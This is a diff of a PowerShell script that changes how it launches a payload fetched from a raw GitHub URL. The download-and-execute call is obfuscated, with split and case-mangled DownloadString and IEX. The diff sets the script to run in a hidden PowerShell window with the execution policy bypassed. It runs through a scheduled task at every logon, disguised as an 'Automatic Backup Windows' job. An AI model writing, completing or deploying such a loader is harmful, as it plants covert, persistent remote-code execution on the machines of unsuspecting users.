@@ -11,8 +11,8 @@ switch ($os.Version) {
 
 $powershellcode = ("https://raw.githubusercontent.com/43a1723/test/main/download.ps1")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$powershellcode')"
-
-$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "I'E'X($download)" 
+$need = "-Win Hidden -NoP -ExecutionPolicy Bypass"
+$task_action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "$need I'E'X($download)" 
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
 $task_name = "Automatic Backup Windows $version_machine"
 $task_desc = "Always Backup & Fix If Windows $version_machine ERROR. "
